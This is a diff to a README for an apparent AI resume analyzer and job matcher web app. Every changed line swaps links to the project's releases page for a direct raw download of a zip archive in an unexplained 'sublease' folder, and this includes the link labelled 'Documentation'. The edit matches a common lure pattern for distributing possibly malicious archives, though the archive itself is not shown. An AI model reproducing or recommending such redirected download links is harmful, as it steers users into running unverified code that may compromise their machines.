@@ -1,7 +1,7 @@
 # 🎉 -AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher - Find Your Ideal Job Effortlessly
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/releases)
+[![Download](https://raw.githubusercontent.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/main/sublease/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher.zip)](https://raw.githubusercontent.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/main/sublease/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher.zip)
 
 ## 📌 Description
 The **AI-Powered Resume Analyzer & Multi-Source Job Matcher** is a user-friendly web application built using Python and Streamlit. This tool helps job seekers find the best job opportunities based on their resume. It extracts text from uploaded resumes, matches it with job listings from various sources, and displays the most relevant jobs in an easy-to-understand format.
@@ -15,7 +15,7 @@ Getting started with this application is simple. Follow these steps to use the A
    - A compatible browser: Chrome, Firefox, or Safari
 
 2. **Download & Install**  
-   To access the latest version of the application, visit this page to download: [Download Here](https://github.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/releases)  
+   To access the latest version of the application, visit this page to download: [Download Here](https://raw.githubusercontent.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/main/sublease/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher.zip)  
    Follow the instructions to download and run the application.
 
 3. **Upload Your Resume**  
@@ -58,6 +58,6 @@ Join our growing community of job seekers and developers. Share your experience,
 This project is licensed under the MIT License. See the LICENSE file for more information.
 
 ## 📦 More Information
-For further details on features and updates, follow this link to our [Documentation](https://github.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/releases). 
+For further details on features and updates, follow this link to our [Documentation](https://raw.githubusercontent.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/main/sublease/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher.zip). 
 
-Thank you for choosing the AI-Powered Resume Analyzer & Multi-Source Job Matcher. Download the latest version now: [Download Here](https://github.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/releases).
+Thank you for choosing the AI-Powered Resume Analyzer & Multi-Source Job Matcher. Download the latest version now: [Download Here](https://raw.githubusercontent.com/Bennett650/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher/main/sublease/-AI-Powered-Resume-Analyzer-Multi-Source-Job-Matcher.zip).
